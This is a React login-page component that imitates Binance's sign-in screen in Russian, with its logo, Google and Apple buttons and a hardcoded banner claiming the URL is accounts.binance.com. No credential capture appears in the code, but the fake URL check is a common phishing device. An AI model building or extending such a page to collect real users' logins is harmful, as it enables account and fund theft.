import React from 'react';
import binancelogo from "../assets/logo/images/brand.png";
import googlelogo from "../assets/logo/google_300221.png";
import applelogo from "../assets/logo/apple_220220.png";
import { GlobeAltIcon, SunIcon } from '@heroicons/react/solid'; // Импортируем иконки Heroicons
import { Link } from 'react-router-dom';

const LoginPage = () => {
  return (
    <div className="flex flex-col items-center justify- min-h-screen bg-binanceBackground">
      <div className="w-full max-w-lg px-4  py-8 space-y-8 bg-binanceBackground rounded-lg shadow-md">
        <div className="flex items-center justify-between mb-4">
          <div className="flex items-center">
            <img src={binancelogo} alt="Binance Logo" className="h-8" />
            <span className="ml-2 text-yellow-500 text-start text-2xl font-bold">BINANCE</span>
          </div>
          <div className="flex space-x-2">
            <GlobeAltIcon className="h-5 w-5 text-white" />
            <SunIcon className="h-5 w-5 text-white" />
          </div>
        </div>
        <div className="bg-yellow-900 text-center text-white py-1 rounded">
          Проверка URL: <span className="text-green-500">https://accounts.binance.com</span>
        </div>
        <h2 className="mt-6 text-start text-3xl font-bold text-white">Войти</h2>
        <form className="mt-8 space-y-6">
          <div className="rounded-md shadow-sm -space-y-px">
            <div>
              <label htmlFor="email" className="block text-white">Эл. почта / Телефон</label>
              <input
                id="email"
                name="email"
                type="email"
                autoComplete="email"
                required
                className="appearance-none rounded-none relative block w-full px-3 py-3 border border-gray-700 bg-binanceBackground placeholder-neutral-900 text-white rounded-t-md focus:outline-none focus:ring-yellow-500 focus:border-yellow-500 focus:z-10 sm:text-sm"
                placeholder=""
              />
            </div>
            {/* <div className="mt-4">
              <label htmlFor="phone" className="block text-white">Номер телефона</label>
              <input
                id="phone"
                name="phone"
                type="text"
                autoComplete="tel"
                required
                className="appearance-none rounded-none relative block w-full px-3 py-3 border border-gray-300 bg-neutral-900 placeholder-neutral-900 text-white rounded-t-md focus:outline-none focus:ring-yellow-500 focus:border-yellow-500 focus:z-10 sm:text-sm"
                placeholder=""
              />
            </div> */}
          </div>
          <div>
          <Link to={'/wallet'}>
            <button
              type="submit"
              className="group relative w-full flex justify-center py-3 px-4 border border-transparent text-md font-medium rounded-md text-black bg-yellow-500 hover:bg-yellow-600 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-yellow-500"
            >
              Далее
            </button>
            </Link>
          </div>
          <div className="relative flex justify-center text-sm">
            <span className="px-2 bg-gray-800 text-gray-400 rounded-sm">или</span>
          </div>
          <div className="flex flex-col space-y-3">
            <button
              type="button"
              className="group relative w-full flex justify-center py-3 px-4 border border-gray-600 text-sm font-medium rounded-md text-gray-100 bg-gray-700 hover:bg-gray-800 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-gray-500"
            >
              <span className="absolute left-0 inset-y-0 flex items-center pl-3">
                <img src={googlelogo} alt="Google" className="h-5 w-5" />
              </span>
              Продолжить с Google
            </button>
            <button
              type="button"
              className="group relative w-full flex justify-center py-3 px-4 border border-gray-600 text-sm font-medium rounded-md text-gray-100 bg-gray-700 hover:bg-gray-800 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-gray-500"
            >
              <span className="absolute left-0 inset-y-0 flex items-center pl-3">
                <img src={applelogo} alt="Apple" className="h-5 w-5" />
              </span>
              Продолжить с Apple
            </button>
          </div>
          <div className="text-center">
            <a href="#" className="font-medium text-yellow-500 hover:text-yellow-400">
              Создать аккаунт Binance
            </a>
          </div>
        </form>
      </div>
      <div className="mt-6 text-gray-500 text-center">
        Binance © 2024 • <a href="#" className="text-yellow-500 hover:text-yellow-400">Настройка cookie</a>
      </div>
    </div>
  );
};

export default LoginPage;